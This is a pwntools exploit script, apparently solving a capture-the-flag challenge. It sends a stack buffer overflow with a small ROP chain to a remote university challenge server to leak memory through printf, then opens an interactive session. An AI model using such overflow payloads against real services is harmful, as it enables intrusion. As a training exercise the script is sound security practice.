from pwn import *

context.arch = 'i386'
context.os = 'linux'
# context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']


#P = process('./bin')
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10104)
#P = gdb.debug("./bin")
# input()
elf = ELF("./bin")

sBuffer = 0xffffcd50
sRip = 0xffffcddc
offset = sRip - sBuffer

target = 0x80eca00

printf = 0x804f260
welcome = 0x8048aa7


# 0x0809dd2f : nop ; mov eax, dword ptr [eax + 4] ; ret
# 0x080b96c6 : pop eax ; ret
popEax = 0x080b96c6
movDwordEax = 0x0809dd2f

possiblePushEaxCallPrint = 0x08048b22


payload = b'A'*offset + p32(popEax) + p32(target - 4) + p32(movDwordEax) + p32(possiblePushEaxCallPrint) #+ p32(printf) + p32(welcome) + p32(target)

P.sendline(payload)
P.sendline('bla')
P.interactive()